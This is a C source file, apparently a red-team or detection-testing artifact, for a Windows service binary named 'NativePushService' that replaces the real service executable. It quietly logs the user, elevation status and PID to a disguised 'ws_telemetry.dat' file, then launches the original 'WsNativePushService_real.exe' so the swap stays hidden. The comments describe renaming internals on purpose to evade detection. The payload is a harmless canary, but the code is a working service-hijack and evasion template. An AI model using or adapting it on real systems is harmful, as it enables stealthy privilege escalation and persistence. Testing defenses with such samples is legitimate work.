/*
 * svc_m1.c -- Mutation 1: Variable randomization + canary path rotation
 * Strategy 1 + Strategy 3 from MUTATION_GUIDE.md
 * All internal names changed, canary writes to ProgramData
 *
 * Build: cl.exe svc_m1.c /Fe:svc_m1.exe /O2 /GS- /link advapi32.lib user32.lib
 */

#include <windows.h>

static SERVICE_STATUS s_ctx;
static SERVICE_STATUS_HANDLE s_ctl;

static void wk(void)
{
    HANDLE fh;
    DWORD bw;
    char ob[256];
    int ol;
    SYSTEMTIME st;
    char un[64];
    DWORD us = 64;
    BOOL ev = FALSE;
    HANDLE tk;

    GetLocalTime(&st);
    GetUserNameA(un, &us);

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tk)) {
        TOKEN_ELEVATION ei;
        DWORD rs;
        if (GetTokenInformation(tk, TokenElevation, &ei, sizeof(ei), &rs))
            ev = ei.TokenIsElevated;
        CloseHandle(tk);
    }

    ol = wsprintfA(ob, "%04d%02d%02d_%02d%02d%02d|%s|elev=%d|pid=%lu|BINARY_REPLACE\r\n",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond,
        un, ev, GetCurrentProcessId());

    fh = CreateFileA("C:\\ProgramData\\ws_telemetry.dat",
        GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
        OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (fh != INVALID_HANDLE_VALUE) {
        SetFilePointer(fh, 0, NULL, FILE_END);
        WriteFile(fh, ob, ol, &bw, NULL);
        CloseHandle(fh);
    }
}

static void lr(void)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char mp[MAX_PATH];
    char *ls;

    GetModuleFileNameA(NULL, mp, MAX_PATH);
    ls = mp;
    for (char *c = mp; *c; c++) {
        if (*c == '\\') ls = c;
    }
    *(ls + 1) = '\0';
    lstrcatA(mp, "WsNativePushService_real.exe");

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (CreateProcessA(mp, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}

static void WINAPI ch(DWORD cc)
{
    switch (cc) {
    case SERVICE_CONTROL_STOP:
    case SERVICE_CONTROL_SHUTDOWN:
        s_ctx.dwCurrentState = SERVICE_STOPPED;
        break;
    case SERVICE_CONTROL_INTERROGATE:
        break;
    }
    SetServiceStatus(s_ctl, &s_ctx);
}

static void WINAPI ep(DWORD ac, LPSTR *av)
{
    (void)ac; (void)av;

    s_ctl = RegisterServiceCtrlHandlerA("NativePushService", ch);
    if (!s_ctl) return;

    s_ctx.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    s_ctx.dwCurrentState = SERVICE_RUNNING;
    s_ctx.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    s_ctx.dwWin32ExitCode = 0;
    SetServiceStatus(s_ctl, &s_ctx);

    wk();
    lr();

    while (s_ctx.dwCurrentState == SERVICE_RUNNING) {
        Sleep(5000);
    }
}

int main(void)
{
    SERVICE_TABLE_ENTRYA dt[] = {
        { "NativePushService", ep },
        { NULL, NULL }
    };
    StartServiceCtrlDispatcherA(dt);
    return 0;
}
